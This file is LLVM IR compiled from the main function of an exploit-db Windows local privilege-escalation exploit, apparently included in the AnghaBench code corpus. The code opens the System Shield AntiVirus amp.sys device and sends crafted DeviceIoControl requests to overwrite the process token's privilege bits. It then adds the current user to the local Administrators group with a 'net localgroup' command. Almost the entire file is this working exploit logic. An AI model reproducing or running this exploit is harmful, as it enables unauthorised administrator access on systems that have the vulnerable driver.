; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43929.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43929.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAX_PATH = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [81 x i8] c"-------------------------------------------------------------------------------\0A\00", align 1
@.str.1 = private unnamed_addr constant [81 x i8] c"  System Shield AntiVirus & AntiSpyware (amp.sys) Arbitrary Write EoP Exploit  \0A\00", align 1
@.str.2 = private unnamed_addr constant [81 x i8] c"                 Tested on 64bit Windows 7 / Windows 10 (1709)                 \0A\00", align 1
@.str.3 = private unnamed_addr constant [43 x i8] c"\0A[i] Address of current process token 0x%p\00", align 1
@.str.4 = private unnamed_addr constant [63 x i8] c"\0A[i] Address of _SEP_TOKEN_PRIVILEGES 0x%p will be overwritten\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"\\\\.\\%s\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"amp\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@FILE_SHARE_READ = common dso_local global i32 0, align 4
@FILE_SHARE_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [29 x i8] c"\0A[-] Open %s device failed\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"\0A[+] Open %s device successful\00", align 1
@.str.9 = private unnamed_addr constant [38 x i8] c"\0A[~] Press any key to continue . . .\0A\00", align 1
@.str.10 = private unnamed_addr constant [44 x i8] c"[+] Overwritten _SEP_TOKEN_PRIVILEGES bits\0A\00", align 1
@.str.11 = private unnamed_addr constant [45 x i8] c"\0A[-] Failed to obtain current username: %d\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [71 x i8] c"[*] Adding current user '%s' account to the local administrators group\00", align 1
@.str.13 = private unnamed_addr constant [38 x i8] c"net localgroup Administrators %s /add\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  %13 = alloca [3 x i32], align 4
  %14 = alloca [3 x i32], align 4
  %15 = alloca [1 x i32], align 4
  %16 = alloca i32, align 4
  %17 = alloca [100 x i8], align 16
  %18 = alloca i64, align 8
  %19 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 64, i32* %7, align 4
  %20 = load i32, i32* @MAX_PATH, align 4
  %21 = zext i32 %20 to i64
  %22 = call i8* @llvm.stacksave()
  store i8* %22, i8** %10, align 8
  %23 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %11, align 8
  store i32 0, i32* %12, align 4
  %24 = bitcast [3 x i32]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %24, i8 0, i64 12, i1 false)
  %25 = bitcast [3 x i32]* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %25, i8 0, i64 12, i1 false)
  %26 = bitcast [1 x i32]* %15 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %26, i8 0, i64 4, i1 false)
  %27 = load i32, i32* @MAX_PATH, align 4
  %28 = zext i32 %27 to i64
  %29 = alloca i8, i64 %28, align 16
  store i64 %28, i64* %18, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.1, i64 0, i64 0))
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.2, i64 0, i64 0))
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %34 = call i32 (...) @GetCurrentProcess()
  %35 = call i32 (...) @GetCurrentProcessId()
  %36 = call i32 @TokenAddressCurrentProcess(i32 %34, i32 %35)
  store i32 %36, i32* %8, align 4
  %37 = load i32, i32* %8, align 4
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.3, i64 0, i64 0), i32 %37)
  %39 = load i32, i32* %8, align 4
  %40 = load i32, i32* %7, align 4
  %41 = add nsw i32 %39, %40
  store i32 %41, i32* %6, align 4
  %42 = load i32, i32* %6, align 4
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.4, i64 0, i64 0), i32 %42)
  %44 = getelementptr inbounds [3 x i32], [3 x i32]* %13, i64 0, i64 0
  store i32 8, i32* %44, align 4
  %45 = getelementptr inbounds [1 x i32], [1 x i32]* %15, i64 0, i64 0
  %46 = ptrtoint i32* %45 to i32
  %47 = getelementptr inbounds [3 x i32], [3 x i32]* %13, i64 0, i64 1
  store i32 %46, i32* %47, align 4
  %48 = load i32, i32* %6, align 4
  %49 = add nsw i32 %48, 1
  %50 = getelementptr inbounds [3 x i32], [3 x i32]* %13, i64 0, i64 2
  store i32 %49, i32* %50, align 4
  %51 = getelementptr inbounds [3 x i32], [3 x i32]* %14, i64 0, i64 0
  store i32 8, i32* %51, align 4
  %52 = getelementptr inbounds [1 x i32], [1 x i32]* %15, i64 0, i64 0
  %53 = ptrtoint i32* %52 to i32
  %54 = getelementptr inbounds [3 x i32], [3 x i32]* %14, i64 0, i64 1
  store i32 %53, i32* %54, align 4
  %55 = load i32, i32* %6, align 4
  %56 = add nsw i32 %55, 9
  %57 = getelementptr inbounds [3 x i32], [3 x i32]* %14, i64 0, i64 2
  store i32 %56, i32* %57, align 4
  %58 = call i32 @sprintf(i8* %23, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  %59 = load i32, i32* @GENERIC_READ, align 4
  %60 = load i32, i32* @GENERIC_WRITE, align 4
  %61 = or i32 %59, %60
  %62 = load i32, i32* @FILE_SHARE_READ, align 4
  %63 = load i32, i32* @FILE_SHARE_WRITE, align 4
  %64 = or i32 %62, %63
  %65 = load i32, i32* @OPEN_EXISTING, align 4
  %66 = call i64 @CreateFile(i8* %23, i32 %61, i32 %64, i32* null, i32 %65, i32 0, i32* null)
  store i64 %66, i64* %9, align 8
  %67 = load i64, i64* %9, align 8
  %68 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %69 = icmp eq i64 %67, %68
  br i1 %69, label %70, label %72

70:                                               ; preds = %2
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0), i8* %23)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %19, align 4
  br label %103

72:                                               ; preds = %2
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0), i8* %23)
  br label %74

74:                                               ; preds = %72
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.9, i64 0, i64 0))
  %76 = call i32 (...) @getch()
  %77 = load i64, i64* %9, align 8
  %78 = getelementptr inbounds [3 x i32], [3 x i32]* %13, i64 0, i64 0
  %79 = call i32 @DeviceIoControl(i64 %77, i32 2252803, i32* %78, i32 12, i32* null, i32 0, i32* %12, i32* null)
  %80 = load i64, i64* %9, align 8
  %81 = getelementptr inbounds [3 x i32], [3 x i32]* %14, i64 0, i64 0
  %82 = call i32 @DeviceIoControl(i64 %80, i32 2252803, i32* %81, i32 12, i32* null, i32 0, i32* %12, i32* null)
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.10, i64 0, i64 0))
  %84 = load i64, i64* %9, align 8
  %85 = call i32 @CloseHandle(i64 %84)
  store i32 100, i32* %16, align 4
  %86 = getelementptr inbounds [100 x i8], [100 x i8]* %17, i64 0, i64 0
  %87 = call i32 @GetUserName(i8* %86, i32* %16)
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %92, label %89

89:                                               ; preds = %74
  %90 = call i32 (...) @GetLastError()
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.11, i64 0, i64 0), i32 %90)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %19, align 4
  br label %103

92:                                               ; preds = %74
  %93 = getelementptr inbounds [100 x i8], [100 x i8]* %17, i64 0, i64 0
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.12, i64 0, i64 0), i8* %93)
  %95 = getelementptr inbounds [100 x i8], [100 x i8]* %17, i64 0, i64 0
  %96 = call i32 @sprintf(i8* %29, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.13, i64 0, i64 0), i8* %95)
  %97 = call i32 (...) @TakeOwnership()
  %98 = call i32 @WriteToRegistry(i8* %29)
  %99 = call i32 (...) @TriggerCommand()
  %100 = call i32 @Sleep(i32 1000)
  %101 = call i32 (...) @RestorePermissions()
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  store i32 1, i32* %19, align 4
  br label %103

103:                                              ; preds = %92, %89, %70
  %104 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %104)
  %105 = load i32, i32* %3, align 4
  ret i32 %105
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i32 @TokenAddressCurrentProcess(i32, i32) #3

declare dso_local i32 @GetCurrentProcess(...) #3

declare dso_local i32 @GetCurrentProcessId(...) #3

declare dso_local i32 @sprintf(i8*, i8*, i8*) #3

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32*) #3

declare dso_local i32 @getch(...) #3

declare dso_local i32 @DeviceIoControl(i64, i32, i32*, i32, i32*, i32, i32*, i32*) #3

declare dso_local i32 @CloseHandle(i64) #3

declare dso_local i32 @GetUserName(i8*, i32*) #3

declare dso_local i32 @GetLastError(...) #3

declare dso_local i32 @TakeOwnership(...) #3

declare dso_local i32 @WriteToRegistry(i8*) #3

declare dso_local i32 @TriggerCommand(...) #3

declare dso_local i32 @Sleep(i32) #3

declare dso_local i32 @RestorePermissions(...) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
